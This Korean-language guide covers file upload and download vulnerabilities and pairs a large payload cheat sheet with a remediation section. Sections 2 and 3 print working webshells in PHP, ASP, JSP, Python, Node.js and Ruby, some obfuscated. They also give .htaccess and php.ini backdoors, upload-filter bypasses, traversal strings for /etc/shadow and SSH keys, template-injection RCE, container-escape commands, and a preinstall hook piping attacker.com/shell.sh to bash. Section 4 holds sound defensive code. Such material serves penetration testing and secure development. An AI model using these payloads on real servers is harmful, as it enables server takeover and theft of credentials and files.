# 파일 업로드/다운로드 취약점 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### 파일 업로드/다운로드 취약점이란?
웹 애플리케이션에서 파일 업로드 및 다운로드 기능에 대한 적절한 검증과 제한이 없을 때 발생하는 취약점으로, 공격자가 악성 파일을 업로드하거나 시스템 파일에 무단 접근할 수 있는 보안 취약점입니다.

### 파일 업로드 취약점 유형

#### 1.1. 악성 파일 업로드 (Malicious File Upload)
- 웹쉘, 백도어 등 악성 스크립트 업로드
- 실행 가능한 파일 업로드를 통한 시스템 장악
- 파일 확장자 검증 우회

#### 1.2. 파일 덮어쓰기 (File Overwrite)
- 중요 시스템 파일 덮어쓰기
- 설정 파일 변조
- 다른 사용자 파일 덮어쓰기

#### 1.3. 디렉토리 트래버설 (Directory Traversal)
- 상위 디렉토리 접근을 통한 시스템 파일 접근
- 임의 경로에 파일 저장
- 서버 파일 시스템 구조 노출

### 파일 다운로드 취약점 유형

#### 1.4. 임의 파일 다운로드 (Arbitrary File Download)
- 시스템 파일 무단 다운로드
- 다른 사용자의 파일 접근
- 백업 파일, 로그 파일 등 민감 정보 노출

#### 1.5. 경로 조작 (Path Manipulation)
- Directory Traversal을 통한 시스템 파일 접근
- 파일 경로 검증 우회
- 심볼릭 링크 악용

### 공격 시나리오

#### 업로드 공격 시나리오:
1. **정찰**: 업로드 기능 발견 및 제한사항 파악
2. **우회**: 파일 확장자, MIME 타입, 매직 바이트 검증 우회
3. **업로드**: 악성 파일 (웹쉘) 업로드
4. **실행**: 업로드된 파일에 접근하여 서버 장악

#### 다운로드 공격 시나리오:
1. **정찰**: 다운로드 기능 및 파라미터 분석
2. **경로 조작**: Directory Traversal 시도
3. **파일 접근**: 시스템 파일 또는 민감 파일 다운로드
4. **정보 수집**: 획득한 파일로 추가 공격 벡터 확보

### 일반적인 취약한 코드 패턴

#### 취약한 업로드 코드 (PHP):
```php
$uploaddir = '/uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "파일 업로드 성공";
}
```

#### 취약한 다운로드 코드 (Java):
```java
@GetMapping("/download")
public void downloadFile(@RequestParam String filename, HttpServletResponse response) {
    File file = new File("/files/" + filename);
    // 경로 검증 없이 직접 파일 제공
    Files.copy(file.toPath(), response.getOutputStream());
}
```

---

## 2. 기본 페이로드

### 2.1. 파일 업로드 기본 테스트

#### 2.1.1. 확장자 우회 테스트
```bash
# 기본 웹쉘 파일들
shell.php
shell.asp
shell.aspx
shell.jsp
shell.py

# 확장자 변형
shell.php5
shell.phtml
shell.inc
shell.pht
shell.shtml

# 대소문자 혼용
shell.PHP
shell.Php
shell.pHp

# 널 바이트 우회
shell.php%00.jpg
shell.jsp%00.png
shell.php\x00.gif
```

#### 2.1.2. MIME 타입 우회
```http
# Content-Type 헤더 변조
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain

# 실제 파일은 PHP 웹쉘이지만 이미지로 위장
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

#### 2.1.3. 매직 바이트 우회
```bash
# PHP 웹쉘에 이미지 헤더 추가
# GIF 헤더 + PHP 코드
GIF89a<?php system($_GET['cmd']); ?>

# JPEG 헤더 + PHP 코드
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>

# PNG 헤더 + PHP 코드
\x89PNG\x0d\x0a\x1a\x0a<?php system($_GET['cmd']); ?>
```

### 2.2. 기본 웹쉘 페이로드

#### 2.2.1. PHP 웹쉘
```php
# 간단한 명령 실행
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# 파일 관리 기능
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
if(isset($_POST['file']) && isset($_POST['content'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    echo "File written successfully";
}
?>

# 고급 웹쉘 (난독화)
<?php $a=$_GET;$b=$a['x'];$c=base64_decode($b);eval($c); ?>
```

#### 2.2.2. ASP/ASPX 웹쉘
```asp
<!-- ASP Classic -->
<%eval request("cmd")%>
<%Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll())%>

<!-- ASP.NET -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if(Request["cmd"] != null) {
        Process.Start("cmd.exe", "/c " + Request["cmd"]);
    }
}
</script>
```

#### 2.2.3. JSP 웹쉘
```jsp
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.BufferedReader br = new java.io.BufferedReader(
        new java.io.InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

### 2.3. 파일 다운로드 기본 테스트

#### 2.3.1. Directory Traversal
```bash
# 기본 경로 조작
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
..%2f..%2f..%2fetc%2fpasswd

# URL 인코딩
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 유니코드 인코딩
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

#### 2.3.2. 시스템 파일 접근
```bash
# Linux/Unix 시스템
/etc/passwd
/etc/shadow
/etc/hosts
/proc/version
/var/log/apache2/access.log
/var/log/nginx/error.log
/home/user/.ssh/id_rsa

# Windows 시스템
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\sam
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
```

#### 2.3.3. 애플리케이션 파일 접근
```bash
# 설정 파일
config.php
database.conf
.env
application.properties
web.config

# 백업 파일
backup.sql
database_backup.sql
config.php.bak
index.php~

# 로그 파일
error.log
access.log
debug.log
application.log
```

---

## 3. 특수 페이로드

### 3.1. 고급 업로드 우회 기법

#### 3.1.1. 다중 확장자 우회
```bash
# 서버가 마지막 확장자만 검사하는 경우
shell.php.jpg
shell.asp.png
shell.jsp.gif

# 아파치 mod_rewrite 악용
shell.php.test (RewriteRule로 .test를 .php로 처리)
shell.jpg.php (MultiViews 옵션 악용)

# IIS 파일 처리 특성 악용
shell.asp;.jpg
shell.aspx:.jpg (Windows NTFS 대체 데이터 스트림)
```

#### 3.1.2. HTTP 헤더 조작
```http
# Content-Length 조작으로 업로드 크기 제한 우회
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 1000

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# Transfer-Encoding 활용
Transfer-Encoding: chunked
Content-Type: multipart/form-data
```

#### 3.1.3. 파일명 조작
```bash
# 경로 조작을 통한 임의 위치 저장
../../var/www/html/shell.php
..\..\..\inetpub\wwwroot\shell.asp

# 특수문자를 이용한 우회
shell.php%20
shell.php.
shell.php::$DATA (Windows NTFS)

# 유니코드 우회
shell.p‌hp (Zero-Width Non-Joiner 사용)
shell.php (전각 문자 사용)
```

#### 3.1.4. 압축 파일 악용
```bash
# ZIP 파일 내부 경로 조작
# zip slip 취약점 악용
zip -r malicious.zip ../../../var/www/html/shell.php

# 압축 해제 시 실행되는 파일
symlink_attack.zip (심볼릭 링크 포함)
zip_bomb.zip (압축 폭탄)

# 자동 압축 해제 기능 악용
shell.tar.gz
shell.zip
```

### 3.2. 웹쉘 고급 기법

#### 3.2.1. 난독화된 웹쉘
```php
# Base64 인코딩
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# ROT13 인코딩
<?php eval(str_rot13('riny($_CBFG[\'pbqr\']);')); ?>

# 변수 치환
<?php $a='sy'; $b='stem'; $c=$a.$b; $c($_GET['x']); ?>

# 함수명 동적 생성
<?php $f='s'.'y'.'s'.'t'.'e'.'m'; $f($_GET['c']); ?>

# 배열 활용
<?php $x=array('s','y','s','t','e','m'); $f=implode('',$x); $f($_GET['cmd']); ?>
```

#### 3.2.2. 메모리 상주 웹쉘
```php
# .htaccess를 통한 지속성 확보
# .htaccess 파일 내용:
AddType application/x-httpd-php .jpg
php_value auto_prepend_file "/path/to/backdoor.php"

# PHP.INI 조작
<?php 
if(isset($_GET['install'])) {
    $ini = file_get_contents(php_ini_loaded_file());
    $ini .= "\nauto_prepend_file=/tmp/backdoor.php";
    file_put_contents(php_ini_loaded_file(), $ini);
}
?>
```

#### 3.2.3. 다단계 업로드
```php
# 1단계: 무해한 파일 업로드
upload: config.txt
content: <?php /*config file*/ ?>

# 2단계: 파일 내용 수정 기능 악용
modify config.txt → <?php system($_GET['cmd']); ?>

# 3단계: 파일 확장자 변경 또는 include 악용
rename config.txt → config.php
또는 include 'config.txt'를 통한 실행
```

### 3.3. 서버별 특화 공격

#### 3.3.1. Apache 서버 공격
```bash
# .htaccess 업로드를 통한 설정 변조
AddType application/x-httpd-php .txt
AddType application/x-httpd-php .jpg
Options +ExecCGI
AddHandler cgi-script .sh

# mod_cgi 활용 (CGI 스크립트 업로드)
#!/bin/bash
echo "Content-Type: text/html"
echo ""
echo "<pre>"
/bin/bash -c "$QUERY_STRING"
echo "</pre>"
```

#### 3.3.2. IIS 서버 공격
```asp
# web.config 조작
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="PHP_via_FastCGI" path="*.jpg" verb="*" 
                 modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" />
        </handlers>
    </system.webServer>
</configuration>

# ASP.NET 핸들러 등록
<httpHandlers>
    <add verb="*" path="*.jpg" type="System.Web.UI.PageHandlerFactory" />
</httpHandlers>
```

#### 3.3.3. Nginx 서버 공격
```bash
# PHP-FPM 설정 악용
# nginx.conf에 잘못된 설정이 있는 경우
location ~ \.php$ {
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}

# 업로드 파일: shell.jpg
# 요청: GET /uploads/shell.jpg/test.php
# Nginx가 shell.jpg를 PHP로 처리할 수 있음
```

### 3.4. 고급 Directory Traversal 기법

#### 3.4.1. 인코딩 우회
```bash
# URL 인코딩
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd (이중 인코딩)

# 유니코드 인코딩
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

# HTML 엔티티 인코딩
..&#x2f;..&#x2f;..&#x2f;etc&#x2f;passwd
```

#### 3.4.2. 운영체제별 경로 조작
```bash
# Windows 경로
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..\..\..\..\windows\win.ini

# Linux/Unix 경로
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../home/user/.bash_history

# 절대 경로 시도
/etc/passwd
C:\windows\system32\drivers\etc\hosts
```

#### 3.4.3. 심볼릭 링크 악용
```bash
# Linux에서 심볼릭 링크 생성 후 업로드
ln -s /etc/passwd symlink.txt
zip archive.zip symlink.txt

# Windows에서 정션 포인트 활용
mklink /J junction_folder C:\windows\system32\

# tar 파일을 통한 심볼릭 링크 업로드
tar -czf malicious.tar.gz --dereference important_file
```

### 3.5. 파일 타입별 공격 벡터

#### 3.5.1. 이미지 파일 악용
```php
# 이미지 파일에 PHP 코드 삽입
# 파일: malicious.jpg
# EXIF 데이터에 PHP 코드 삽입
<?php
$img = imagecreatefromjpeg('original.jpg');
$exif = array('Copyright' => '<?php system($_GET["cmd"]); ?>');
// EXIF 데이터 조작 후 저장
?>

# GIF 파일 구조 악용
GIF89a
<script language="php">system($_GET['cmd']);</script>

# SVG 파일 XSS + 서버 사이드 실행
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert('XSS')</script>
    <foreignObject>
        <html xmlns="http://www.w3.org/1999/xhtml">
            <body><?php system($_GET['cmd']); ?></body>
        </html>
    </foreignObject>
</svg>
```

#### 3.5.2. 문서 파일 악용
```xml
# Word 문서 매크로
<xml>
    <o:DocumentProperties>
        <o:Template>file:///C:/windows/system32/calc.exe</o:Template>
    </o:DocumentProperties>
</xml>

# PDF 파일 JavaScript
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/OpenAction <<
    /Type /Action
    /S /JavaScript
    /JS (app.alert('XSS in PDF');)
>>
>>
```

#### 3.5.3. 압축 파일 악용
```bash
# Zip Slip 공격
zip malicious.zip ../../../var/www/html/shell.php

# 압축 폭탄 (Zip Bomb)
# 작은 크기 파일이 압축 해제 시 거대한 크기로 팽창
zip -0 -r zipbomb.zip /dev/zero

# 압축 파일 내 스크립트 자동 실행
# RAR 자동 실행 스크립트
rar a -sfx autorun.rar shell.exe
```

### 3.6. 서버 사이드 언어별 공격

#### 3.6.1. Python 서버 공격
```python
# Python 웹쉘
import os
import cgi

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    print("Content-Type: text/html\n")
    print("<pre>")
    os.system(cmd)
    print("</pre>")

# Django 템플릿 인젝션 (업로드된 템플릿 파일)
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit() }}

# Flask 템플릿 인젝션
{{ config.items() }}
{{ ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['os'].popen('id').read() }}
```

#### 3.6.2. Node.js 서버 공격
```javascript
// JavaScript 웹쉘
const { exec } = require('child_process');
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
    const query = url.parse(req.url, true).query;
    if (query.cmd) {
        exec(query.cmd, (error, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            res.end(stdout + stderr);
        });
    }
}).listen(8080);

// 패키지 의존성 악용
// package.json 조작
{
  "scripts": {
    "preinstall": "curl http://attacker.com/shell.sh | bash"
  }
}
```

#### 3.6.3. Ruby 서버 공격
```ruby
# Ruby 웹쉘
require 'cgi'
cgi = CGI.new

puts "Content-Type: text/html\n\n"
cmd = cgi['cmd']
if cmd
    puts "<pre>"
    puts `#{cmd}`
    puts "</pre>"
end

# Rails 템플릿 인젝션
<%= system(params[:cmd]) %>
<%= eval(params[:code]) %>
```

### 3.7. 클라우드 환경 특화 공격

#### 3.7.1. AWS S3 버킷 공격
```bash
# S3 버킷 정책 파일 업로드
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket-name/*"
    }
  ]
}

# 메타데이터 조작
aws s3 cp shell.jpg s3://bucket/shell.jpg --metadata="Content-Type=application/x-php"

# Lambda 함수 코드 삽입
# 업로드된 ZIP 파일이 Lambda로 배포되는 경우
import json
import os

def lambda_handler(event, context):
    cmd = event.get('cmd', 'id')
    result = os.popen(cmd).read()
    return {'statusCode': 200, 'body': result}
```

#### 3.7.2. Azure Blob Storage 공격
```bash
# Blob 속성 조작
az storage blob upload --file shell.php --name shell.jpg \
   --container-name uploads --content-type "image/jpeg" \
   --content-encoding "gzip"

# SAS 토큰 악용
https://account.blob.core.windows.net/container/shell.php?sv=2021-06-08&ss=b&srt=co&sp=rwdlacupx&se=2024-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=signature
```

### 3.8. 컨테이너 환경 공격

#### 3.8.1. Docker 컨테이너 탈출
```bash
# 컨테이너 정보 수집
cat /proc/1/cgroup
ls -la /var/run/docker.sock

# 호스트 파일시스템 마운트 확인
df -h
mount | grep docker

# Docker 소켓 접근 시 컨테이너 생성
curl -X POST -H "Content-Type: application/json" \
     -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/mnt"]}}' \
     unix://var/run/docker.sock/containers/create
```

#### 3.8.2. Kubernetes 환경 공격
```yaml
# 악성 매니페스트 파일 업로드
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: container
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 30; done"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

---

## 4. 조치 가이드

### 4.1. 파일 업로드 보안 조치

#### 4.1.1. 파일 확장자 및 MIME 타입 검증
```java
@Service
public class FileUploadService {
    
    private static final Set<String> ALLOWED_EXTENSIONS = 
        Set.of("jpg", "jpeg", "png", "gif", "pdf", "doc", "docx");
    
    private static final Set<String> ALLOWED_MIME_TYPES = 
        Set.of("image/jpeg", "image/png", "image/gif", 
               "application/pdf", "application/msword");
    
    public boolean isValidFile(MultipartFile file) {
        String filename = file.getOriginalFilename();
        String contentType = file.getContentType();
        
        // 확장자 검증
        String extension = getFileExtension(filename).toLowerCase();
        if (!ALLOWED_EXTENSIONS.contains(extension)) {
            return false;
        }
        
        // MIME 타입 검증
        if (!ALLOWED_MIME_TYPES.contains(contentType)) {
            return false;
        }
        
        // 매직 바이트 검증
        return validateMagicBytes(file, extension);
    }
    
    private boolean validateMagicBytes(MultipartFile file, String extension) {
        try {
            byte[] bytes = file.getBytes();
            return switch (extension) {
                case "jpg", "jpeg" -> bytes[0] == (byte)0xFF && bytes[1] == (byte)0xD8;
                case "png" -> bytes[0] == (byte)0x89 && bytes[1] == 0x50;
                case "gif" -> bytes[0] == 0x47 && bytes[1] == 0x49;
                case "pdf" -> bytes[0] == 0x25 && bytes[1] == 0x50;
                default -> false;
            };
        } catch (IOException e) {
            return false;
        }
    }
}
```

#### 4.1.2. 파일명 및 경로 검증
```python
import os
import re
import uuid
from pathlib import Path

class SecureFileHandler:
    def __init__(self, upload_dir):
        self.upload_dir = Path(upload_dir).resolve()
        self.max_filename_length = 255
        self.allowed_chars = re.compile(r'^[a-zA-Z0-9._-]+$')
    
    def sanitize_filename(self, filename):
        # 원본 파일명 정규화
        filename = os.path.basename(filename)
        filename = filename.replace(' ', '_')
        
        # 위험한 문자 제거
        dangerous_chars = ['..', '/', '\\', '<', '>', ':', '"', '|', '?', '*']
        for char in dangerous_chars:
            filename = filename.replace(char, '')
        
        # 길이 제한
        if len(filename) > self.max_filename_length:
            name, ext = os.path.splitext(filename)
            filename = name[:self.max_filename_length-len(ext)] + ext
        
        # 유일한 파일명 생성
        unique_filename = f"{uuid.uuid4().hex}_{filename}"
        return unique_filename
    
    def validate_file_path(self, filepath):
        # 절대 경로로 변환
        full_path = (self.upload_dir / filepath).resolve()
        
        # 업로드 디렉토리 외부 접근 차단
        try:
            full_path.relative_to(self.upload_dir)
            return str(full_path)
        except ValueError:
            raise SecurityError("Path traversal attempt detected")
```

#### 4.1.3. 파일 스캔 및 검증
```python
import magic
import yara
import hashlib

class FileSecurityScanner:
    def __init__(self):
        self.yara_rules = yara.compile(filepath='malware_rules.yar')
        self.max_file_size = 10 * 1024 * 1024  # 10MB
        
    def scan_uploaded_file(self, file_path):
        scan_results = {
            'safe': True,
            'issues': []
        }
        
        # 파일 크기 검증
        file_size = os.path.getsize(file_path)
        if file_size > self.max_file_size:
            scan_results['safe'] = False
            scan_results['issues'].append('File size exceeds limit')
        
        # 실제 파일 타입 검증
        file_type = magic.from_file(file_path)
        if 'executable' in file_type.lower():
            scan_results['safe'] = False
            scan_results['issues'].append('Executable file detected')
        
        # 악성코드 시그니처 검사
        with open(file_path, 'rb') as f:
            matches = self.yara_rules.match(data=f.read())
            if matches:
                scan_results['safe'] = False
                scan_results['issues'].append(f'Malware detected: {matches}')
        
        # 파일 해시 확인 (알려진 악성 파일)
        file_hash = self.calculate_file_hash(file_path)
        if self.is_known_malware(file_hash):
            scan_results['safe'] = False
            scan_results['issues'].append('Known malware hash')
        
        return scan_results
    
    def calculate_file_hash(self, file_path):
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
```

### 4.2. 파일 다운로드 보안 조치

#### 4.2.1. 경로 검증 및 제한
```java
@RestController
public class SecureFileDownloadController {
    
    private final String DOWNLOAD_BASE_PATH = "/app/downloads/";
    private final Set<String> ALLOWED_EXTENSIONS = 
        Set.of("pdf", "jpg", "png", "txt", "doc", "docx");
    
    @GetMapping("/download")
    public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
        try {
            // 파일명 검증
            if (!isValidFilename(filename)) {
                return ResponseEntity.badRequest().build();
            }
            
            // 경로 정규화 및 검증
            Path filePath = Paths.get(DOWNLOAD_BASE_PATH, filename).normalize();
            
            // Directory Traversal 방지
            if (!filePath.startsWith(Paths.get(DOWNLOAD_BASE_PATH).normalize())) {
                throw new SecurityException("Path traversal attempt detected");
            }
            
            // 파일 존재 및 접근 권한 확인
            File file = filePath.toFile();
            if (!file.exists() || !file.canRead()) {
                return ResponseEntity.notFound().build();
            }
            
            // 사용자 권한 확인
            if (!hasPermissionToDownload(filename, getCurrentUser())) {
                return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
            }
            
            Resource resource = new FileSystemResource(file);
            return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, 
                       "attachment; filename=\"" + file.getName() + "\"")
                .body(resource);
                
        } catch (SecurityException e) {
            logger.warn("Security violation in file download: {}", e.getMessage());
            return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
        }
    }
    
    private boolean isValidFilename(String filename) {
        // 기본 검증
        if (filename == null || filename.trim().isEmpty()) {
            return false;
        }
        
        // 위험한 문자 검증
        String[] dangerousPatterns = {"..", "/", "\\", ":", "*", "?", "\"", "<", ">", "|"};
        for (String pattern : dangerousPatterns) {
            if (filename.contains(pattern)) {
                return false;
            }
        }
        
        // 확장자 검증
        String extension = getFileExtension(filename);
        return ALLOWED_EXTENSIONS.contains(extension.toLowerCase());
    }
}
```

#### 4.2.2. 접근 권한 제어
```python
from functools import wraps
import jwt
from pathlib import Path

class FileAccessController:
    def __init__(self, base_path, secret_key):
        self.base_path = Path(base_path).resolve()
        self.secret_key = secret_key
        
    def require_permission(self, required_role):
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                token = request.headers.get('Authorization')
                if not token:
                    return {'error': 'Authentication required'}, 401
                
                try:
                    payload = jwt.decode(token.split(' ')[1], 
                                      self.secret_key, algorithms=['HS256'])
                    user_role = payload.get('role')
                    
                    if user_role != required_role:
                        return {'error': 'Insufficient permissions'}, 403
                        
                except jwt.InvalidTokenError:
                    return {'error': 'Invalid token'}, 401
                
                return func(*args, **kwargs)
            return wrapper
        return decorator
    
    @require_permission('admin')
    def download_system_file(self, filename):
        # 관리자만 시스템 파일 다운로드 가능
        safe_path = self.validate_and_resolve_path(filename)
        return self.serve_file(safe_path)
    
    def validate_and_resolve_path(self, filename):
        # 파일명 정규화
        clean_filename = self.sanitize_filename(filename)
        full_path = (self.base_path / clean_filename).resolve()
        
        # 기본 경로 외부 접근 차단
        if not str(full_path).startswith(str(self.base_path)):
            raise ValueError("Invalid file path")
        
        # 파일 존재 확인
        if not full_path.exists() or not full_path.is_file():
            raise FileNotFoundError("File not found")
            
        return full_path
```

#### 4.2.3. 임시 다운로드 링크 생성
```javascript
// Express.js 임시 다운로드 링크
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

class SecureDownloadService {
    constructor(secretKey) {
        this.secretKey = secretKey;
        this.downloadTokens = new Map();
    }
    
    generateDownloadToken(filename, userId, expiresIn = 3600) {
        const tokenData = {
            filename: filename,
            userId: userId,
            exp: Math.floor(Date.now() / 1000) + expiresIn
        };
        
        const token = jwt.sign(tokenData, this.secretKey);
        
        // 일회용 토큰으로 저장
        const downloadId = crypto.randomUUID();
        this.downloadTokens.set(downloadId, {
            token: token,
            used: false,
            createdAt: Date.now()
        });
        
        return downloadId;
    }
    
    validateAndConsumeToken(downloadId) {
        const tokenData = this.downloadTokens.get(downloadId);
        
        if (!tokenData || tokenData.used) {
            throw new Error('Invalid or expired download token');
        }
        
        try {
            const decoded = jwt.verify(tokenData.token, this.secretKey);
            
            // 토큰을 일회용으로 마킹
            tokenData.used = true;
            
            return decoded;
        } catch (error) {
            throw new Error('Invalid download token');
        }
    }
    
    // 정기적으로 만료된 토큰 정리
    cleanupExpiredTokens() {
        const now = Date.now();
        for (const [id, data] of this.downloadTokens) {
            if (now - data.createdAt > 3600000) { // 1시간 후 정리
                this.downloadTokens.delete(id);
            }
        }
    }
}
```

### 4.3. 파일 저장 및 처리 보안

#### 4.3.1. 안전한 파일 저장
```php
<?php
class SecureFileUpload {
    private $uploadDir;
    private $allowedTypes;
    private $maxFileSize;
    
    public function __construct() {
        $this->uploadDir = '/var/www/uploads/'; // 웹 루트 외부
        $this->allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        $this->maxFileSize = 5 * 1024 * 1024; // 5MB
    }
    
    public function uploadFile($file) {
        // 기본 검증
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('File upload error');
        }
        
        if ($file['size'] > $this->maxFileSize) {
            throw new Exception('File size exceeds limit');
        }
        
        // MIME 타입 검증
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mimeType = $finfo->file($file['tmp_name']);
        
        if (!in_array($mimeType, $this->allowedTypes)) {
            throw new Exception('File type not allowed');
        }
        
        // 매직 바이트 검증
        if (!$this->validateMagicBytes($file['tmp_name'], $mimeType)) {
            throw new Exception('File content validation failed');
        }
        
        // 안전한 파일명 생성
        $extension = $this->getExtensionFromMimeType($mimeType);
        $safeFilename = uniqid('file_', true) . '.' . $extension;
        $destinationPath = $this->uploadDir . $safeFilename;
        
        // 파일 이동
        if (!move_uploaded_file($file['tmp_name'], $destinationPath)) {
            throw new Exception('Failed to save file');
        }
        
        // 실행 권한 제거
        chmod($destinationPath, 0644);
        
        return $safeFilename;
    }
    
    private function validateMagicBytes($filepath, $expectedMimeType) {
        $handle = fopen($filepath, 'rb');
        $bytes = fread($handle, 8);
        fclose($handle);
        
        $magicBytes = [
            'image/jpeg' => [0xFF, 0xD8, 0xFF],
            'image/png' => [0x89, 0x50, 0x4E, 0x47],
            'application/pdf' => [0x25, 0x50, 0x44, 0x46]
        ];
        
        if (!isset($magicBytes[$expectedMimeType])) {
            return false;
        }
        
        $expected = $magicBytes[$expectedMimeType];
        for ($i = 0; $i < count($expected); $i++) {
            if (ord($bytes[$i]) !== $expected[$i]) {
                return false;
            }
        }
        
        return true;
    }
}
?>
```

#### 4.3.2. 파일 격리 및 샌드박스
```bash
# Docker를 이용한 파일 처리 격리
FROM alpine:latest
RUN adduser -D -s /bin/sh fileprocessor
USER fileprocessor
WORKDIR /app

# 파일 처리 전용 컨테이너에서 실행
docker run --rm -v /uploads:/input:ro -v /processed:/output \
           --network=none \
           --read-only \
           --tmpfs /tmp \
           file-processor:latest process-file /input/uploaded_file
```

#### 4.3.3. 안티바이러스 연동
```python
import subprocess
import tempfile

class AntivirusScanner:
    def __init__(self, scanner_path='/usr/bin/clamdscan'):
        self.scanner_path = scanner_path
    
    def scan_file(self, file_path):
        try:
            # ClamAV를 이용한 파일 스캔
            result = subprocess.run([
                self.scanner_path, 
                '--no-summary', 
                '--infected', 
                file_path
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return {'clean': True, 'threat': None}
            elif result.returncode == 1:
                threat_info = result.stdout.strip()
                return {'clean': False, 'threat': threat_info}
            else:
                return {'clean': False, 'error': 'Scan failed'}
                
        except subprocess.TimeoutExpired:
            return {'clean': False, 'error': 'Scan timeout'}
        except Exception as e:
            return {'clean': False, 'error': str(e)}
    
    def quarantine_file(self, file_path):
        # 의심 파일을 격리 디렉토리로 이동
        quarantine_dir = '/var/quarantine/'
        quarantine_name = f"quarantine_{int(time.time())}_{os.path.basename(file_path)}"
        quarantine_path = os.path.join(quarantine_dir, quarantine_name)
        
        shutil.move(file_path, quarantine_path)
        os.chmod(quarantine_path, 0o000)  # 모든 권한 제거
        
        return quarantine_path
```

### 4.4. 웹 서버 보안 설정

#### 4.4.1. Apache 보안 설정
```apache
# httpd.conf 또는 .htaccess 설정

# 업로드 디렉토리에서 스크립트 실행 차단
<Directory "/var/www/uploads">
    Options -ExecCGI -Indexes
    AllowOverride None
    AddHandler cgi-script .php .pl .py .jsp .asp .sh
    
    # 모든 파일을 다운로드로만 처리
    <FilesMatch ".*">
        Header set Content-Disposition "attachment"
        Header set X-Content-Type-Options "nosniff"
    </FilesMatch>
    
    # PHP 실행 차단
    php_flag engine off
    RemoveHandler .php .phtml .php3 .php4 .php5
</Directory>

# 위험한 파일 확장자 차단
<FilesMatch "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$">
    Require all denied
</FilesMatch>

# 파일 크기 제한
LimitRequestBody 10485760  # 10MB
```

#### 4.4.2. Nginx 보안 설정
```nginx
# nginx.conf 설정

# 업로드 디렉토리 보안 설정
location /uploads/ {
    # 스크립트 실행 차단
    location ~ \.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$ {
        deny all;
    }
    
    # 다운로드 전용 헤더 설정
    add_header Content-Disposition "attachment";
    add_header X-Content-Type-Options "nosniff";
    add_header X-Frame-Options "DENY";
    
    # 직접 접근 차단
    internal;
}

# 파일 크기 제한
client_max_body_size 10M;

# 임시 파일 보안 설정
client_body_temp_path /var/nginx/temp 1 2;
client_body_in_file_only on;
client_body_buffer_size 128K;
```

